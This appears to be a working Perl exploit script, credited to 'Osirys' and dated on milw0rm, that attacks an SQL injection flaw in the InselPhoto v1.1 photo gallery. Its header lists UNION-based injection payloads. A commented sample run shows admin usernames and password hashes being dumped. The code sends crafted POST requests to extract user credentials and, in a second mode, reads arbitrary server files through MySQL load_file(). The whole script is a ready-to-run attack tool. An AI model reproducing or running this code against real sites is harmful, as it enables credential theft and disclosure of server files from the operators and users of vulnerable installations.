#!/usr/bin/perl

# |----------------------------------------------------------------------------------------------------------------------------------|
# |                     INFORMATIONS                                                                                                 |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |Web Application :  InselPhoto v1.1                                                                                                |
# |Download        :  http://www.inselphoto.com/download.php?p=get_inselphoto                                                        |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |Remote Exploit (Admin credentials extract + File Disclosure via Sql Injection)                                                    |
# |by Osirys                                                                                                                         |
# |osirys[at]autistici[dot]org                                                                                                       |
# |osirys.org                                                                                                                        |
# |Greets to: evilsocket, Fireshot, Todd and str0ke                                                                                  |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |BUG [Sql Injection]
# |  Vulnerable file is: /[path]/search.php line 37
# |SQL Injections used by this sploit :
# |[1] ' union select 0,0,concat(username,0x3a,password),0,0,0,0,0 from inselphoto_users#
# |[2] ' union select 0,0,load_file('lf'),0,0,0,0,0#
# |----------------------------------------------------------------------------------------------------------------------------------|
# |This CMS is vulnerable to sql injection.This simple exploit just uses the sql bug to get admin credentials (username,password) and
# |uses load_file() mysql function to disclosure local file on the server.
# |This time no RCE exploit avaiable, becouse POST query is filtered with htmlentities, so will be impossible to write php code into
# |a file, for the fact that < > char will be html encoded.
# |----------------------------------------------------------------------------------------------------------------------------------|


# -----------------------------------------------------------------------------------------------------------------------------------|
# Exploit in action [>!]
# -----------------------------------------------------------------------------------------------------------------------------------|
# osirys[~]>$ perl sql2.txt http://localhost/InselPhoto/ admin_hash
#
#   -----------------------------------
#     InselPhoto SQL Injection Sploit
#             Coded by Osirys
#   -----------------------------------
#
# [*] Extracting users credentials ..
#
# [*] Username: admin
# [*] Password: 5f4dcc3b5aa765d61d8327deb882cf99
#
# [*] Username: osirys
# [*] Password: 6e1459df459890dfd8b4c3687c18abba
#
# [!] Succesfully Exploited !
#
# osirys[~]>$
# -----------------------------------------------------------------------------------------------------------------------------------|
# osirys[~]>$ perl sql2.txt http://localhost/InselPhoto/ file_disc
#
#   -----------------------------------
#     InselPhoto SQL Injection Sploit
#             Coded by Osirys
#   -----------------------------------
#
# [*] cat /home/osirys/test.txt
# Local file loaded :D
#
# [*] cat exit
# [-] Quitting ..
# osirys[~]>$
# -----------------------------------------------------------------------------------------------------------------------------------|

use IO::Socket;

my $host   = $ARGV[0];
my $expl   = $ARGV[1];

my $sql_inj_path = "/search.php";

($host,$expl) || help("-1");
cheek($host,$expl) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

&adm_hash if $expl_way == 1;
&file_discl if $expl_way == 2;

sub adm_hash {
    my $url = $path.$sql_inj_path;

    my $code=  "query=%27+union+select+0%2C0%2Cconcat%28username%2C0x3a%2Cpassword%29%2C0%2C0%2C0%2C0%2C0+from+inselphoto_users%23&type=photo";

    my $length = length($code);

    my $data = "POST ".$url." HTTP/1.1\r\n".
               "Host: ".$h0st."\r\n".
               "Keep-Alive: 300\r\n".
               "Connection: keep-alive\r\n".
               "Content-Type: application/x-www-form-urlencoded\r\n".
               "Content-Length: ".$length."\r\n\r\n".
               $code."\r\n";

    my $socket   =  new IO::Socket::INET(
                                         PeerAddr => $h0st,
                                         PeerPort => '80',
                                         Proto    => 'tcp',
                                        ) or die "[-] Can't connect to $h0st:80\n[?] $! \n\n";

    print "[*] Extracting users credentials ..\n\n";
    $socket->send($data);

    while (my $e = <$socket>) {
        if ($e =~ /([a-zA-Z0-9-_.]{2,15}):([a-f0-9]{32})/) {
            $gotcha = 1;
            print "[*] Username: $1\n";
            print "[*] Password: $2\n\n";
        }
    }

    if ($gotcha != 1) {
        print "[-] Can't extract users credentials\n[-] Exploit Failed !\n\n";
        exit(0);
    }

    print "[!] Succesfully Exploited !\n\n";
    exit(0);
}

sub file_discl {
    my @outs;
    print "[*] cat ";
    my $file = <STDIN>;
    chomp($file);
    $file !~ /exit/ || die "[-] Quitting ..\n";
    if ($file !~ /\/(.*)/) {
        print "\n[-] Bad filename !\n";
        &file_discl;
    }

    my $url = $path.$sql_inj_path;
    my $lfile = html($file);
    my $code=  "query=%27+union+select+0%2C0%2Cload_file%28%27".$lfile."%27%29%2C0%2C0%2C0%2C0%2C0%23&type=photo";

    my $length = length($code);

    my $data = "POST ".$url." HTTP/1.1\r\n".
               "Host: ".$h0st."\r\n".
               "Keep-Alive: 300\r\n".
               "Connection: keep-alive\r\n".
               "Content-Type: application/x-www-form-urlencoded\r\n".
               "Content-Length: ".$length."\r\n\r\n".
               $code."\r\n";

    my $socket   =  new IO::Socket::INET(
                                         PeerAddr => $h0st,
                                         PeerPort => '80',
                                         Proto    => 'tcp',
                                        ) or die "[-] Can't connect to $h0st:80\n[?] $! \n\n";

    $socket->send($data);

    while ((my $e = <$socket>)&&($stop != 1)) {
        if ($e =~ /\/0\/0' rel='lightbox\[insel\]/) {
            $stop = 1;
        }
        push(@outs,$e);
    }
    my $out = join '', @outs;
    my $content = tag($out);
    if ($content =~ /\$href='users\/\*\*(.+)\/0\/0'\$rel='lightbox\[insel\]/) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        $out =~ s/$out/$out\n/ if ($out !~ /\n$/);
        print "$out\n";
        &file_discl;
    }
    else {
        $c++;
        print "[-] Can't find ".$file." \n";
        $c < 3 || die "[-] File Disclosure failed !\n[-] Something wrong. Exploit Failed !\n\n";
        &file_discl;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub html() {
    my $string = $_[0];
    $string =~ s/\//\%2F/g;
    $string =~ s/\\/\%5C/g;
    return($string);
}

sub cheek() {
    my $host  = $_[0];
    my $expl  = $_[1];
    if ($host =~ /http:\/\/(.*)/) {
        $ch_host = 1;
    }
    if ($expl =~ /admin_hash/) {
        $ch_expl = 1;
        $expl_way = 1;
    }
    elsif ($expl =~ /file_disc/) {
        $ch_expl = 1;
        $expl_way = 2;
    }
    return 1 if ((($ch_host)&&($ch_expl)) == 1);
    &help("-2");
}

sub banner {
    print "\n".
          "  -----------------------------------\n".
          "    InselPhoto SQL Injection Sploit  \n".
          "            Coded by Osirys          \n".
          "  -----------------------------------\n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Input Error, missed some arguments !\n\n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad arguments !\n\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path admin_hash\n";
    print "    Ex:     perl $0 http://site.it/cms/      admin_hash\n";
    print "[*] Usage : perl $0 http://hostname/cms_path file_disc\n";
    print "    Ex:     perl $0 http://site.it/cms/      file_disc\n";
    exit(0);
}

# milw0rm.com [2009-02-11]